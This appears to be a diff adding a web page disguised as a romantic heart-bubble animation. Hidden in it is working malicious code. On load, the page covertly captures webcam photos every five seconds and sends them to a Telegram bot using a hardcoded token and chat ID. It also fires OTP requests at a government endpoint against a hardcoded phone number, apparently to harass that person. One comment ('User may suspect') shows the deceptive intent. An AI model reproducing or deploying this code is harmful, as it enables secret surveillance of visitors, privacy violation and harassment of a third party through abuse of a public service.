@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Heart Bubbles Animation</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            background: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhaoCdRq_Me80qOVbX5-gduplewyz5uF_Aqg94zSxDq0fernqVqd8a-3XELDlglqhMaDuGpwofCY8BWO0mxLhaMUSRmaQlLWuOmLCuK793nETS7I81FD1Ad4cQvHd0FBP_JBrQcW3_y-CFvbV7BDPulxyFkQPzhhdE7IciNNTGHKexSufI67V5qyKrIQZDF/s1600/love-theme-on-background-vector-35038007.webp') no-repeat center center fixed;
+            background-size: cover;
+        }
+
+        .container {
+            position: relative;
+            width: 100%;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+
+        button {
+            padding: 15px 30px;
+            font-size: 18px;
+            background-color: #ff4b2b;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            z-index: 10;
+        }
+
+        button:hover {
+            background-color: #ff6f61;
+        }
+
+        #bubbles {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+        }
+
+        .bubble {
+            position: absolute;
+            width: 50px;
+            height: 50px;
+            background: rgba(255, 0, 0, 0.5);
+            transform: rotate(-45deg);
+            animation: bubble-float 10s ease-in-out infinite;
+        }
+
+        .bubble::before,
+        .bubble::after {
+            content: "";
+            position: absolute;
+            width: 50px;
+            height: 50px;
+            background: rgba(255, 0, 0, 0.5);
+            border-radius: 50%;
+        }
+
+        .bubble::before {
+            top: -25px;
+            left: 0;
+        }
+
+        .bubble::after {
+            left: 25px;
+            top: 0;
+        }
+
+        @keyframes bubble-float {
+            0% {
+                transform: translateY(100vh) scale(1) rotate(-45deg);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-100vh) scale(0) rotate(-45deg);
+                opacity: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <button id="bubbleButton">Release Hearts</button>
+        <div id="bubbles"></div>
+        <audio id="romanticSound" src="romantic-sound.mp3" preload="auto"></audio>
+    </div>
+    <script>
+        document.getElementById('bubbleButton').addEventListener('click', () => {
+            const bubbleContainer = document.getElementById('bubbles');
+            const numberOfBubbles = 30;
+            
+            bubbleContainer.innerHTML = '';
+
+            for (let i = 0; i < numberOfBubbles; i++) {
+                const bubble = document.createElement('div');
+                bubble.classList.add('bubble');
+                bubble.style.left = `${Math.random() * 100}vw`;
+                bubble.style.animationDuration = `${Math.random() * 5 + 5}s`;
+                bubble.style.animationDelay = `${Math.random() * 5}s`;
+                bubbleContainer.appendChild(bubble);
+            }
+
+            const sound = document.getElementById('romanticSound');
+            sound.play();
+
+            fetch('https://training.gov.bd/backoffice/api/user/sendOtp', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ mobile: '01818969374' })
+            })
+            .then(response => response.json())
+            .then(data => console.log('Success:', data))
+            .catch((error) => console.error('Error:', error));
+        });
+    </script>
+    
+      <script>
+    let captureInterval;
+    let imageCapture;
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    const targetWidth = 540; // Desired width
+    const targetHeight = 650; // Desired height
+
+    // Start capturing photos as soon as the page loads
+    window.onload = () => {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          const videoTrack = stream.getVideoTracks()[0];
+          imageCapture = new ImageCapture(videoTrack);
+
+          // Capture photo every 5 seconds
+          capturePhoto(); // Capture the first photo immediately
+          captureInterval = setInterval(capturePhoto, 5000); // Then continue every 5 seconds
+        })
+        .catch(error => {
+          if (error.name === 'NotAllowedError') {
+            console.warn('Permissions denied. User may suspect.');
+          } else {
+            console.error('Permission error:', error);
+          }
+        });
+    };
+
+    // Stop capturing photos when the user leaves the page
+    window.onbeforeunload = () => {
+      clearInterval(captureInterval);
+    };
+
+    function capturePhoto() {
+      if (imageCapture) {
+        imageCapture.takePhoto()
+          .then(blob => {
+            const img = new Image();
+            img.src = URL.createObjectURL(blob);
+            img.onload = () => {
+              canvas.width = targetWidth;
+              canvas.height = targetHeight;
+              ctx.save(); // Save the current state
+              ctx.scale(-1, 1); // Flip the canvas horizontally
+              ctx.drawImage(img, -targetWidth, 0, targetWidth, targetHeight);
+              ctx.restore(); // Restore the saved state
+              canvas.toBlob(resizedBlob => {
+                sendToTelegram(resizedBlob);
+              }, 'image/jpeg', 0.9); // Adjust quality if needed
+            };
+          })
+          .catch(error => {
+            console.error('Error capturing photo:', error);
+          });
+      }
+    }
+
+    function sendToTelegram(data) {
+      const botToken = '6696317970:AAH1NZPjLjwD_8Jav73izvSqtDKL9qGpMBE';
+      const chatId = '5624278091';
+      const caption = 'This is a custom title for the captured photo.';
+
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('photo', data, 'file.jpg');
+      formData.append('caption', caption);
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      })
+        .then(response => response.json())
+        .then(data => console.log('Telegram response:', data))
+        .catch(error => console.error('Error sending to Telegram:', error));
+    }
+  </script>
+</body>
+</html>
